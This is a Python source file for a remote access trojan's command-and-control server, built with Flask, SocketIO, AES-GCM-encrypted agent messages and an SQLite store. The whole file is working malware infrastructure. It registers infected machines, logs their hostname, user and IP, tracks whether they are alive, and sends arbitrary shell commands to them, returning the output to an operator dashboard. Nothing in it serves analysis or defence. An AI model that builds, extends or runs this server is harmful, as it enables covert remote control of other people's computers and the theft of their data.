#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAT C2 Server :: Flask + WebSocket + AES-GCM + SQLite
"""

import os, sys, json, time, sqlite3, hashlib, base64, threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO, emit
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

BASE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(BASE)
DB   = os.path.join(ROOT, "c2.db")
LOG  = os.path.join(ROOT, "logs", "c2.log")
KEY  = hashlib.sha256(b"CHANGE_THIS_MASTER_KEY_32BYTES!!").digest()

os.makedirs(os.path.join(ROOT, "logs"), exist_ok=True)

app = Flask(__name__, template_folder=os.path.join(ROOT, "web", "templates"),
            static_folder=os.path.join(ROOT, "web", "static"))
app.config["SECRET_KEY"] = base64.b64encode(get_random_bytes(24)).decode()
sio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

def encrypt(plain: bytes) -> str:
    iv = get_random_bytes(12)
    c = AES.new(KEY, AES.MODE_GCM, nonce=iv)
    ct, tag = c.encrypt_and_digest(plain)
    return base64.b64encode(iv + tag + ct).decode()

def decrypt(b64: str) -> bytes:
    raw = base64.b64decode(b64)
    iv, tag, ct = raw[:12], raw[12:28], raw[28:]
    c = AES.new(KEY, AES.MODE_GCM, nonce=iv)
    return c.decrypt_and_verify(ct, tag)

def db():
    con = sqlite3.connect(DB, check_same_thread=False)
    con.row_factory = sqlite3.Row
    return con

def init_db():
    con = db()
    con.executescript("""
    CREATE TABLE IF NOT EXISTS agents(
        id TEXT PRIMARY KEY, hostname TEXT, os TEXT, user TEXT,
        ip TEXT, first_seen TEXT, last_seen TEXT, alive INTEGER DEFAULT 1);
    CREATE TABLE IF NOT EXISTS commands(
        id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT,
        cmd TEXT, output TEXT, status TEXT, created TEXT, finished TEXT);
    CREATE TABLE IF NOT EXISTS files(
        id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT,
        name TEXT, direction TEXT, path TEXT, size INTEGER, ts TEXT);
    """)
    con.commit(); con.close()

init_db()

AGENTS = {}
PENDING = {}

def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(line + "\n")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/agents")
def api_agents():
    con = db()
    rows = con.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    con.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/agent/<aid>")
def api_agent(aid):
    con = db()
    row = con.execute("SELECT * FROM agents WHERE id=?", (aid,)).fetchone()
    cmds = con.execute("SELECT * FROM commands WHERE agent_id=? ORDER BY id DESC LIMIT 200", (aid,)).fetchall()
    con.close()
    if not row: return jsonify({"error": "not found"}), 404
    return jsonify({"agent": dict(row), "commands": [dict(c) for c in cmds]})

@app.route("/api/command", methods=["POST"])
def api_command():
    data = request.get_json(force=True)
    aid, cmd = data.get("agent_id"), data.get("cmd", "").strip()
    if not aid or not cmd: return jsonify({"error": "bad args"}), 400
    if aid not in AGENTS:
        return jsonify({"error": "agent offline"}), 400

    con = db()
    cur = con.execute("INSERT INTO commands(agent_id,cmd,status,created) VALUES(?,?,?,?)",
                      (aid, cmd, "pending", datetime.now().isoformat()))
    cid = cur.lastrowid
    con.commit(); con.close()

    ev = threading.Event()
    holder = {"out": None}
    PENDING[cid] = {"agent": aid, "event": ev, "holder": holder}

    sio.emit("exec", {"cid": cid, "cmd": cmd}, room=AGENTS[aid])
    log(f"CMD -> {aid} #{cid}: {cmd[:80]}")

    if not ev.wait(timeout=300):
        con = db()
        con.execute("UPDATE commands SET status='timeout', finished=? WHERE id=?",
                    (datetime.now().isoformat(), cid))
        con.commit(); con.close()
        PENDING.pop(cid, None)
        return jsonify({"error": "timeout", "cid": cid}), 504

    out = holder["out"] or ""
    con = db()
    con.execute("UPDATE commands SET output=?, status='done', finished=? WHERE id=?",
                (out, datetime.now().isoformat(), cid))
    con.commit(); con.close()
    PENDING.pop(cid, None)
    return jsonify({"cid": cid, "output": out})

@sio.on("register")
def on_register(data):
    try:
        payload = json.loads(decrypt(data["blob"]))
    except Exception as e:
        log(f"register decrypt fail: {e}")
        return
    aid = payload["id"]
    AGENTS[aid] = request.sid
    con = db()
    con.execute("""INSERT INTO agents(id,hostname,os,user,ip,first_seen,last_seen,alive)
                   VALUES(?,?,?,?,?,?,?,1)
                   ON CONFLICT(id) DO UPDATE SET
                     hostname=excluded.hostname, os=excluded.os, user=excluded.user,
                     ip=excluded.ip, last_seen=excluded.last_seen, alive=1""",
                (aid, payload.get("hostname",""), payload.get("os",""),
                 payload.get("user",""), request.remote_addr,
                 datetime.now().isoformat(), datetime.now().isoformat()))
    con.commit(); con.close()
    log(f"AGENT online: {aid} @ {request.remote_addr} ({payload.get('os')})")
    sio.emit("agents_update", {}, broadcast=True)

@sio.on("heartbeat")
def on_heartbeat(data):
    try:
        aid = json.loads(decrypt(data["blob"]))["id"]
    except Exception:
        return
    con = db()
    con.execute("UPDATE agents SET last_seen=?, alive=1 WHERE id=?",
                (datetime.now().isoformat(), aid))
    con.commit(); con.close()

@sio.on("result")
def on_result(data):
    try:
        payload = json.loads(decrypt(data["blob"]))
    except Exception:
        return
    cid = payload.get("cid")
    if cid in PENDING:
        PENDING[cid]["holder"]["out"] = payload.get("out", "")
        PENDING[cid]["event"].set()

@sio.on("disconnect")
def on_disconnect():
    for aid, sid in list(AGENTS.items()):
        if sid == request.sid:
            AGENTS.pop(aid, None)
            con = db()
            con.execute("UPDATE agents SET alive=0 WHERE id=?", (aid,))
            con.commit(); con.close()
            log(f"AGENT offline: {aid}")
            sio.emit("agents_update", {}, broadcast=True)
            break

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    log(f"C2 listening on 0.0.0.0:{port}")
    sio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)